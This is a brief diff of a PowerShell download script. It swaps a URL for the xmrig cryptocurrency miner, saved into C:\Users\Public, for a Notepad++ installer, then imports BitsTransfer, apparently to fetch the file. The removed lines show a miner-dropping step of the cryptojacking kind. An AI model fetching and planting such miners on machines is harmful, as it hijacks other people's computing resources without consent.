@@ -1,5 +1,5 @@
-$url = "https://github.com/xmrig/xmrig/releases/download/v2.6.4/xmrig-2.6.4-gcc-win64.zip"
-$output = "C:\Users\Public\xmrig.zip"
+$url = "https://notepad-plus-plus.org/repository/7.x/7.5.8/npp.7.5.8.Installer.exe"
+$output = "C:\Users\Public\npp.exe"
 $start_time = Get-Date
 
 Import-Module BitsTransfer
